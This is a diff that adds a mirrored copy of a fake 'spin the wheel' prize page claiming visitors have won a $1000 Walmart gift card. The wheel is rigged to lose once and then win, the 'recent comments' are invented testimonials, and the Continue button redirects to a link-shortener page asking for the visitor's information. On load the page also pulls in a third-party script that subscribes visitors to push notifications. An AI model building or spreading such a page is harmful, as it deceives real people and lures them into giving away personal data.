@@ -1,1 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<!-- Mirrored from bestprizewheel.com/wmspin2/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 25 May 2020 10:29:10 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>BESTPRIZEWHEEL GIFT</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="assets/indexcc20.css?var=1.1">
+<script>(function(document,window){var script=document.createElement("script");script.type="text/javascript";script.src="https://push.smpush.com/scripts/push/4v9e1omdz8";script.onload=function(){push_init();push_subscribe();};document.getElementsByTagName("head")[0].appendChild(script);})(document,window);</script>
+</head>
+<body>
+<style>
+html,body {
+    font-family: 'Roboto', sans-serif;
+    background:#f3f3f3;
+    border: 0;
+    margin: 0;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    overflow-x: hidden;
+}
+header {
+    display:block;
+    width:100%;
+    background: #ffffff;
+    padding:10px;
+    -webkit-box-shadow: 0px 7px 5px 0px rgba(233,233,233,1);
+    -moz-box-shadow: 0px 7px 5px 0px rgba(233,233,233,1);
+    box-shadow: 0px 7px 5px 0px rgba(233,233,233,1);
+}
+header img {
+    display:block;
+    max-width:182px;
+    width:100%;
+}
+.header-text{
+    display:block;
+    margin: 0 auto;
+    max-width: 1200px;
+    width:100%;
+    font-size:40px;
+    text-align: center;
+
+}
+.header-text .header-text1{
+    display:block;
+    margin: 4% auto 0;
+    font-weight:700;
+    font-size:95%;
+    color:#133d5e;
+}
+.header-text .header-text2{
+    margin: 1% auto 0;
+    font-size:50%;
+    color: #707071;
+}
+
+.day, .isp{
+    font-weight:700;
+}
+.yellow {
+    color: #fffc00;
+}
+.header-text3{
+    display:inline-block;
+    background: #5db44c;
+    color:#fff;
+    font-size:80%;
+    font-weight:700;
+    margin-top:2%;
+    padding:1.25%;
+    max-width: 625px;
+    width:100%;
+    border-radius: 5px;
+
+}
+.spinner-wrapper{
+    position: relative;
+    display:block;
+    margin: 0 auto;
+    max-width:512px;
+    width:100%;
+    text-align:center;
+    z-index: 1;
+    margin-top: 2%;
+  /*  overflow: hidden;*/
+}
+.spinner-wrapper .spinner{
+    position: absolute;
+    top: 5.5%;
+    left: 7.5%;
+    z-index: -1
+}
+.spinner-wrapper img{
+    max-width:512px;
+    width:100%;
+}
+.spinner-wrapper .spinner img{
+    max-width:435px;
+    width:100%;
+}
+.spin-win {
+
+    animation:spin-win;
+    animation-duration: 4s;
+    animation-iteration-count: 1;
+    animation-timing-function: ease;
+    animation-fill-mode: forwards
+}
+.spin-lose {
+
+    animation:spin-lose;
+    animation-duration: 4s;
+    animation-iteration-count: 1;
+    animation-timing-function: ease;
+    animation-fill-mode: forwards
+}
+.spin-again {
+
+    animation:spin-again;
+    animation-duration: 4s;
+    animation-iteration-count: 1;
+    animation-timing-function: ease;
+    animation-fill-mode: forwards
+}
+@-moz-keyframes spin-win { 100% { -moz-transform: rotate(2520deg); } }
+@-webkit-keyframes spin-win { 100% { -webkit-transform: rotate(2520deg); } }
+@keyframes spin-win { 100% { -webkit-transform: rotate(2520deg); transform:rotate(2520deg); } }
+
+@-moz-keyframes spin-lose { 100% { -moz-transform: rotate(2480deg); } }
+@-webkit-keyframes spin-lose { 100% { -webkit-transform: rotate(2480deg); } }
+@keyframes spin-lose { 100% { -webkit-transform: rotate(2480deg); transform:rotate(2480deg); } }
+
+@-moz-keyframes spin-again { 100% { -moz-transform: rotate(2600deg); } }
+@-webkit-keyframes spin-again { 100% { -webkit-transform: rotate(2600deg); } }
+@keyframes spin-again { 100% { -webkit-transform: rotate(2600deg); transform:rotate(2600deg); } }
+
+
+span.success-glow {
+    display:none;
+    position: absolute;
+    top: 2%;
+    left: 0%;
+    
+}
+span.success-glow-start {
+    display:block;
+    animation:zoomIn 0.4s;
+    -webkit-animation: zoomIn 0.4s; /* Safari, Chrome and Opera > 12.1 */
+    -moz-animation: zoomIn 0.4s; /* Firefox < 16 */
+}
+@-moz-keyframes success-grow { 
+    0% { opacity:0; top:8%;width: 10%; left: 5%;}
+    50% { opacity:1;top:-2%; width: 150%;}
+    100% { opacity:1; top: 2%; width:100%}
+}    
+@-webkit-keyframes success-grow {
+    0% { opacity:0; width: 10%;top:8%; left: 5%; }
+    50% { opacity:1;top:-2%; width: 150%;}
+    100% { opacity:1; top: 2%; width:100%}
+}
+@keyframes success-grow { 
+    0% { opacity:0; width: 10%; top:8%; left: 5%; }
+    50% { opacity:1;top:-2%; width: 120%;}
+    100% { opacity:1; top: 2%; width:100%}
+}
+
+@-webkit-keyframes zoomIn {
+    from {
+      opacity: 0;
+      -webkit-transform: scale3d(0.3, 0.3, 0.3);
+      transform: scale3d(0.3, 0.3, 0.3);
+    }
+  
+    50% {
+      opacity: 1;
+    }
+  }
+  
+  @keyframes zoomIn {
+    from {
+      opacity: 0;
+      -webkit-transform: scale3d(0.3, 0.3, 0.3);
+      transform: scale3d(0.3, 0.3, 0.3);
+    }
+  
+    50% {
+      opacity: 1;
+    }
+  }
+  
+  .zoomIn {
+    -webkit-animation-name: zoomIn;
+    animation-name: zoomIn;
+  }
+
+span.success-glow img {
+    max-width:658px;
+    width:100%;
+}
+.domain{
+    text-transform: capitalize;
+}
+.dialog {
+	position: fixed;
+	top: 27%;
+	left: 0;
+	right: 0;
+    display: flex;
+    flex-direction: column;
+	-webkit-box-pack: center;
+	justify-content: center;
+	-webkit-box-align: center;
+    text-align: center;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale; 
+    margin: 0 auto; 
+    max-width: 650px;
+    width:100%;
+    background: #fff;
+    padding: 1% 2% 2% 2%;
+    border-radius:5px;
+    border: solid 2px #f6e4a4;
+    -webkit-box-shadow: -1px -1px 53px 1px rgba(86,86,86,0.23);
+    box-shadow: -1px -1px 53px 1px rgba(86,86,86,0.23);
+    z-index: 99;
+}
+.date {
+    text-align: right;
+    padding-bottom:1%;
+    color:#707071;
+    font-weight:400;
+}
+.dialog .offerImage {
+    display:block;
+    margin: 0 auto;
+}
+
+.dialog .offerImage img{
+    max-width:220px;
+    width:90%;
+}
+.win-dialog .offerImage img{
+    max-width:220px;
+    width:90%;
+}
+@media(max-width: 576px){
+    .dialog .offerImage img{
+        max-width:180px;
+        width:90%;
+    }
+    .win-dialog .offerImage img{
+        max-width:180px;
+        width:90%;
+    }
+}
+.spin-again-dialog .offerImage img{
+    max-width:90px;
+    width:90%;
+}
+
+
+.dialog .offerDesc {
+    max-width: 510px;
+    display: block;
+    width: 100%;
+    margin: 0 auto;
+    color: #707071;
+    font-size:18px;
+}
+.spin-first-dialog .offerDesc3 {
+    color:#133d5e;
+    font-weight:700;
+    
+}
+.dialog .offerText {
+    display:block;
+    font-weight:700;
+    color: #133d5e;
+    margin-top:1%;
+    font-size: 26px;
+
+}
+.dialog .offerButton,.offerStartButton {
+    display:block;
+    margin: 0 auto;
+    font-weight:700;
+    color:#fff;
+    background: #317ebb;
+    font-size:25px;
+    border: 1px solid #c9c9c9;
+    border-radius:5px;
+    padding:1.6%; 
+    max-width:350px;
+    width:100%;
+    cursor: pointer;
+}
+.offerStartButton{
+    background: #5db44c;
+    max-width:430px;
+}
+.dialog .offerButton span { font-weight:400;}
+.spin-again-dialog .offerText {
+    font-size:25px;
+    color: #ea514f;
+    margin-top:4%;
+}
+.win-dialog .congrats {
+    font-size:40px;
+    color: #f10c1a;
+    font-weight:700;
+    margin-bottom:2%;
+}
+.win-dialog .offerText {
+    font-size:25px;
+    color: #5db44c;
+    font-weight:700;
+}
+.win-dialog .offerDesc {
+    max-width:95%
+}
+.win-dialog .offerDesc1 {
+    text-align: left;
+    margin: 3% auto;
+}
+.win-dialog .offerDesc  .ul {
+    display:block;
+    text-align: left;
+    font-size:16px;
+    color:#133d5e;
+}
+.fa-3x{
+    font-size:12px;
+}
+.left-gift{
+    display:inline-block;
+    vertical-align: middle;
+    width:10%;
+    text-align:left;
+}
+.btn-text{
+    width:75%;
+}
+.right-gift{
+    display:inline-block;
+    vertical-align: middle;
+    width:10%;
+    text-align:right;
+}
+span.footer {
+    margin-top: 2%;
+    color: #707071;
+    font-weight: 700;
+    font-size: 18px;
+    font-style: italic;
+}
+.feedback-wrapper {
+    margin: 0 auto 2%;
+    max-width:700px;
+    width:100%;
+    background:#fff;
+    padding:1%;
+    border-radius:5px;
+    border: solid 2px #f6e4a4;
+    -webkit-box-shadow: 0px 0px 28px 9px rgba(233,233,233,1);
+    -moz-box-shadow: 0px 0px 28px 9px rgba(233,233,233,1);
+    box-shadow: 0px 0px 28px 9px rgba(233,233,233,1);
+}
+.feedback-header{
+    padding:1%;
+    font-weight:700;
+    font-size:20px;
+}
+.feedback-item-wrapper{
+    display:block;
+    margin-top:2%;
+
+}
+.feedback-item{
+    display:inline-block;
+    font-size: 14px;
+    font-weight:400;
+    color:#707071;
+    max-width:79%;
+    vertical-align: middle;
+    padding-left:2%;
+}
+.feedback-img{
+    display:inline-block;
+    vertical-align: middle;
+}
+.feedback-img{
+    max-width: 72px;
+    width:100%;
+}
+.feedback-item-name{
+    color:#133d5e;
+    font-weight:700;
+}
+.feedback-item-desc {
+    margin-top:1%;
+}
+.hide-dialog{
+    display:none;
+}
+.show-dialog {
+    display:flex;
+}
+
+@media screen and (max-width:680px){
+    .date {
+        text-align: center;
+    }
+    .dialog {
+        width:85%;
+    }
+    .feedback-wrapper {
+        width: 89%;
+    }  
+    .header-text{
+        font-size:5.5vw;
+        max-width:85%;
+    } 
+    .spin-again-dialog  .offerText span{
+        display: block
+    }
+}
+@media screen and (max-width:599px){
+    header {
+        text-align: center;
+    }
+    header .logo{
+        display:inline-block;
+    }
+    header .logo img {
+        width:85%;
+    }
+
+    .header-text .header-text2 {
+        font-size:18px;
+    } 
+    .header-text3 {
+        padding: 2% 1%;
+        width: 90%;
+    }
+    .spinner-wrapper {
+        width:85%;
+    }
+
+    .feedback-img {
+        max-width: 72px;
+        width: 20%;
+    }
+    .feedback-item {
+        font-size: 12px;
+        width: 78%;
+    }
+}
+@media screen and (max-width:592px){ 
+
+    .spinner-wrapper .spinner {
+        left: 7%;
+    }
+    .spinner-wrapper .spinner img {
+        width: 98%;
+    }  
+}
+@media screen and (max-width:558px){ 
+    .spinner-wrapper .spinner {
+        left: 4%;
+    }
+    .spinner-wrapper .spinner img {
+        width: 93%;
+    }  
+}
+@media screen and (max-width:499px){ 
+    .dialog {
+        padding:6% 3% 6% 3%; 
+    }
+    .date {
+        padding-bottom:2.5%;
+    }
+    .spinner-wrapper .spinner{
+        top: 4.5%;
+    }
+    header .logo img {
+        width: 60%;
+        display: inline-block;
+    }
+    .header-text .header-text1{
+        font-size:100%;
+
+    }
+    .dialog .offerImage {
+        width: 30%;
+    }
+    .win-dialog .congrats {
+        font-size: 7.5vw;
+    }   
+    .dialog .offerText {
+        font-size:6vw;
+    }
+    .spin-again-dialog  .offerText {
+        font-size:5.5vw;
+    }
+    .win-dialog  .offerText{
+        font-size:5.5vw;
+        line-height:1;
+    }
+    .dialog .offerDesc, .dialog .offerDesc .ul, span.footer, .date {
+        font-size: 4vw!important;
+    }
+    .feedback-item-wrapper{
+        margin-top:3%;
+    }
+    .header-text .header-text2 {
+        font-size:13px;
+    }  
+    .spinner-wrapper .spinner {
+        left: -1%;
+    } 
+    .spinner-wrapper .spinner img {
+        width: 86%;
+    }
+    .dialog .offerButton, .offerStartButton {
+
+        font-size: 20px;
+        padding: 2.6%;
+    }
+}
+@media screen and (max-width:389px){ 
+    .dialog .offerButton, .offerStartButton {
+        font-size: 16px;
+    }
+}
+
+
+  </style>
+
+    <header>
+        <div class="logo"><img src="https://i.imgur.com/2gXlngc.png"></div>
+    </header>
+    <div class='header-text'>
+        <div class='header-text1'>Congratulations <span class='brand'></span> user, you have (1) reward pending!</div>
+        <div class='header-text2'>Every <span class='day'>{day}</span> we randomly choose 10 lucky <span class='brand'></span> users to receive a reward.</div>
+        <!-- <div class='header-text3'>Claim Your Prize <span class='yellow'>•</span> Spin the Wheel</div> -->
+    </div>
+
+    <section class="spinner-wrapper ">
+        <span class="success-glow "><img src='https://i.imgur.com/Wld5Z3Y.png'></span>
+            <div class='spinner'>
+                    <img src="https://i.imgur.com/jieNPT4.png" alt="">
+            </div>
+            <img src="https://i.imgur.com/x74z5JK.png" alt="">
+
+    </section>
+    <section class='feedback-wrapper'>
+        <div class="feedback-header">Recent Comments:</div>
+        <div id="feedback">
+        </div>
+    </section>
+    <section class='dialog spin-first-dialog'>
+        <div class="date"></div>
+        <div class="offerImage"><img src="https://i.imgur.com/jLJ6Om7.png"></div>
+        <div class="offerText">Walmart $1000 Gift Card</div>
+        <div class="offerDesc">
+                <p class="offerDesc1">Congratulations <span class='brand'></span> user!</p>
+                <p class="offerDesc2"><span class='domain'></span> would like to thank you for visiting today so we are offering you to the chance to receive a reward.</p>
+                <p class="offerDesc3">Click below to see if you're today's winner!</p>
+        </div>     
+        <button type='button' class="offerStartButton" onclick="spinLose()">
+              <span class='left-gift'>  <svg aria-hidden="true" width="25" height="25" focusable="false" data-prefix="fas" data-icon="gift" role="img" style='font-size:10px' xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-gift fa-w-16 fa-3x"><path fill="currentColor" d="M32 448c0 17.7 14.3 32 32 32h160V320H32v128zm256 32h160c17.7 0 32-14.3 32-32V320H288v160zm192-320h-42.1c6.2-12.1 10.1-25.5 10.1-40 0-48.5-39.5-88-88-88-41.6 0-68.5 21.3-103 68.3-34.5-47-61.4-68.3-103-68.3-48.5 0-88 39.5-88 88 0 14.5 3.8 27.9 10.1 40H32c-17.7 0-32 14.3-32 32v80c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16v-80c0-17.7-14.3-32-32-32zm-326.1 0c-22.1 0-40-17.9-40-40s17.9-40 40-40c19.9 0 34.6 3.3 86.1 80h-86.1zm206.1 0h-86.1c51.4-76.5 65.7-80 86.1-80 22.1 0 40 17.9 40 40s-17.9 40-40 40z" class=""></path></svg></span>
+            <span class='btn-text'>Spin the Wheel</span>
+            <span class='right-gift'>  <svg aria-hidden="true" width="25" height="25"  focusable="false" data-prefix="fas" data-icon="gift" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-gift fa-w-16 fa-3x"><path fill="currentColor" d="M32 448c0 17.7 14.3 32 32 32h160V320H32v128zm256 32h160c17.7 0 32-14.3 32-32V320H288v160zm192-320h-42.1c6.2-12.1 10.1-25.5 10.1-40 0-48.5-39.5-88-88-88-41.6 0-68.5 21.3-103 68.3-34.5-47-61.4-68.3-103-68.3-48.5 0-88 39.5-88 88 0 14.5 3.8 27.9 10.1 40H32c-17.7 0-32 14.3-32 32v80c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16v-80c0-17.7-14.3-32-32-32zm-326.1 0c-22.1 0-40-17.9-40-40s17.9-40 40-40c19.9 0 34.6 3.3 86.1 80h-86.1zm206.1 0h-86.1c51.4-76.5 65.7-80 86.1-80 22.1 0 40 17.9 40 40s-17.9 40-40 40z" class=""></path></svg></span>
+        </button>
+    </section>
+    <section class='dialog spin-again-dialog hide-dialog'>
+            <div class="date"></div>
+            <div class="offerImage"><img src="https://i.imgur.com/YIcrape.png"></div>
+            <div class="offerText spin-again-text">Sorry you didn’t win... <span>You still have (1) Spin Remaining!</span></div>
+            <div class="offerDesc">
+                    <p class="offerDesc1">Please try again, you may be our next winner!</p>
+            </div>  
+            
+            <button type='button' class="offerButton" onclick="spinWin()">Spin Again <span>></span></button>
+    </section>
+    <section class='dialog win-dialog hide-dialog'>
+            <div class="congrats">CONGRATULATIONS!</div>
+            <div class="offerImage"><img src="https://i.imgur.com/jLJ6Om7.png"></div>
+            <div class="offerText">$1000 <span class='brand'></span> Gift Card is reserved for you!</div>
+            <div class="offerDesc">
+                    <div class="offerDesc1"> 
+                        <div class='ul'><strong>Step 1:</strong> Click the “Continue” button to claim your prize.</div>
+                        <div class='ul'><strong>Step 2:</strong> Enter the requested information on the next page to continue for your prize.</div>
+                    </div>
+            </div>  
+            <button type='button' class="offerButton" onclick="redirectToUrl()">Continue <span>></span></button>
+            <span class='footer'>Limited Quantities Remaining</span>
+    </section>
+    <script>
+            var brand = "Walmart";
+            var domain = window.location.hostname;
+            var date = new Date();
+            var qString = location.search!=''?location.search+"&source=spin":"?source=spin";
+            var hopUrl = "https://smrturl.co/24f533c"+qString+"/#!";
+            var monthNames = [
+                                "January", "February", "March",
+                                "April", "May", "June", "July",
+                                "August", "September", "October",
+                                "November", "December"
+                            ]; 
+           var options = { weekday: 'long'};
+           var day = new Intl.DateTimeFormat('en-US', options).format(date);
+
+            var feedback = [
+                {img:'https://i.imgur.com/9PMywDu.jpeg', date:'February 16th // ', name: "Tonya Richards",desc:"Seeing is believing! My $100 gift card arrived in the mail yesterday much to my surprise."},
+                {img:'https://i.imgur.com/VSkLu6Z.png', date:'February 16th // ', name: "Geneva Ross", desc: "My kids love the new Xbox, it can play all the newest games! It was all pretty simple and straight forward."},
+                {img:'https://i.imgur.com/rTaMbCU.png', date:'February 15th // ', name: "Ray Smith", desc: "Just got the $100 gift card from my mailbox! I have a wishlist saved to use this for immediately!"},
+                {img:'https://i.imgur.com/uHorMiL.png', date:'February 15th // ', name: "Christina Gomez", desc: "Always watned a quality pair of wireless headphones and now they are on the way! Now I can workout without the stress of cords getting tangled."},
+                {img:'https://i.imgur.com/lKyFuVo.png', date:'February 14th // ', name: "Stacy Woods", desc: "My old phone was cracked and barely kept a charge for a full-day, now I have a new iPhone in hand and loving life again!"},
+                {img:'https://i.imgur.com/lNZVS2N.png', date:'February 14th // ', name: "Blake Von-Jones", desc: "Didn’t believe it at first but, when my $100 gift card arrived in the mail yesterday I couldn’t wait to stock up on gear for my pup!"},
+                {img:'https://i.imgur.com/SpxABf3.png', date:'February 13th // ', name: "Jennifer Drexler", desc: "I love enjoying the outdoors and now with my $100 gift card I can get some more gear for the upcoming holiday weekend!"}
+            ];
+            var totalFeedback = feedback.length;
+            var feedbackDiv = document.getElementById('feedback');        
+            function redirectToUrl(){
+                window.location.replace(hopUrl);
+            }
+            function spinWin(){
+                document.querySelector(".spin-again-dialog").classList.remove('show-dialog');
+                document.querySelector(".spin-again-dialog").classList.add('hide-dialog');
+                document.querySelector(".spinner").classList.remove('spin-lose');
+                document.querySelector(".spinner").classList.add('spin-win');
+            
+                setTimeout(function () {
+                    document.querySelector(".success-glow").classList.add('success-glow-start');    
+                    setTimeout(function () {
+                      //  document.querySelector(".success-glow").classList.add('success-glow-start');   
+                        document.querySelector(".win-dialog").classList.remove('hide-dialog');
+                        document.querySelector(".win-dialog").classList.add('show-dialog');     
+                    }, 1000);                        
+                }, 4000);
+            }
+            function spinAgain(){
+                document.querySelector(".spin-first-dialog").classList.add('hide-dialog');
+                document.querySelector(".spinner").classList.add('spin-again');
+                setTimeout(function () {
+                    document.querySelector(".spin-again-dialog").classList.remove('hide-dialog');  
+                    document.querySelector(".spin-again-dialog").classList.add('show-dialog');       
+                }, 4000);               
+            }            
+            function spinLose(){
+                document.querySelector(".spin-first-dialog").classList.add('hide-dialog');
+                document.querySelector(".spinner").classList.add('spin-lose');
+                setTimeout(function () {
+                    document.querySelector(".spin-again-dialog").classList.remove('hide-dialog');  
+                    document.querySelector(".spin-again-dialog").classList.add('show-dialog');       
+                }, 4000);                   
+
+            }
+            // function loadDoc() {
+            //     try{
+            //         var xhttp = new XMLHttpRequest();          
+            //         xhttp.onreadystatechange = function() {
+            //             var clientData;
+                        
+            //             if (this.readyState == 4 && this.status == 200) {
+            //                 clientData = JSON.parse(this.responseText);
+            //                 if(clientData['isp']!==undefined){
+                              
+            //                     document.querySelector('.isp').innerHTML = clientData['isp'];
+            //                 }
+
+            //             }
+            //         };
+            //         xhttp.open("GET", "getClientInfo.php", true);
+            //         xhttp.send();
+            //     }
+            //     catch(e){
+            //         console.log(e);
+            //     }
+ 
+            // }    
+        document.addEventListener("DOMContentLoaded", function(){
+            //loadDoc();
+            domain = domain.replace('https:///','').replace('www.','').replace('.com','');
+            document.querySelector('.domain').innerHTML = domain;
+            document.querySelector('.day').innerHTML = day;
+            document.querySelector('.date').innerHTML = monthNames[date.getMonth()] + " "+ date.getDate()+", " + date.getFullYear()
+            brands = document.getElementsByClassName('brand');
+            console.log(brands);
+            brandsEleCount = brands.length;
+            for(var i=0;i<brandsEleCount;i++){
+                brands[i].innerHTML = brand
+            }
+            for(var i=0; i<totalFeedback;i++){
+                var feedbackItemWrapper = document.createElement('div');
+                var feedbackItem = document.createElement('div');
+                var feedbackImg = document.createElement('img');
+                var feedbackItemDate = document.createElement('span');
+                var feedbackItemName = document.createElement('span');
+                var feedbackItemDesc = document.createElement('div'); 
+                //add element attributes
+                feedbackItemWrapper.classList.add("feedback-item-wrapper");  
+                feedbackItemWrapper.classList.add("feedback-item-wrapper");  
+                feedbackImg.classList.add('feedback-img')
+                feedbackItemName.classList.add('feedback-item-name')
+                feedbackItem.classList.add("feedback-item"); 
+                feedbackItemDesc.classList.add('feedback-item-desc');
+                
+                //add contents   
+                feedbackImg.src = feedback[i]['img']  ;      
+                feedbackItemDate.innerHTML = feedback[i]['date'];
+                feedbackItemName.innerHTML = feedback[i]['name'];
+                feedbackItemDesc.innerHTML = feedback[i]['desc'];
+                feedbackItem.appendChild(feedbackItemDate);
+                feedbackItem.appendChild(feedbackItemName)   ;
+                feedbackItem.appendChild(feedbackItemDesc)   ;
+                feedbackItemWrapper.appendChild(feedbackImg);
+                feedbackItemWrapper.appendChild(feedbackItem);
+                feedbackDiv.appendChild(feedbackItemWrapper);
+            }
+            
+
+        });
+     </script>   
+
+</body>
+
+<!-- Mirrored from bestprizewheel.com/wmspin2/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 25 May 2020 10:29:14 GMT -->
+</html>
